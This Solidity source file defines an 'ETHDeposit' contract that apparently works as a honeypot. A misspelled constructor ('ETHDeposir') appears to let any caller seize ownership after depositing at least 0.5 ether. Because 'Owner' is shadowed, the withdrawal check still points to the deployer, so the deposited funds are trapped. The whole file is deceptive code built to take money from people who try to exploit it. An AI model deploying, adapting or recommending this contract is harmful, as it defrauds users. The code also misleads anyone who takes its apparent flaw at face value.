pragma solidity ^0.4.13;

contract Owned {
    address public Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
}

contract ETHDeposit is Owned {
    address public Owner;
    mapping (address => uint) public Deposits;

    event Deposit(uint amount);
    event Withdraw(uint amount);
    
    function ETHDeposir() {
        Owner = msg.sender;
        deposit();
    }
    
    function() payable {
        revert();
    }

    function deposit() payable {
        if (msg.value >= 500 finney)
            if (Deposits[msg.sender] + msg.value >= Deposits[msg.sender]) {
                Deposits[msg.sender] += msg.value;
                Deposit(msg.value);
            }
    }
    
    function withdraw(uint amount) payable onlyOwner {
        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {
            msg.sender.transfer(amount);
            Withdraw(amount);
        }
    }
    
    function kill() onlyOwner {
        if (this.balance == 0)
            selfdestruct(msg.sender);
    }
}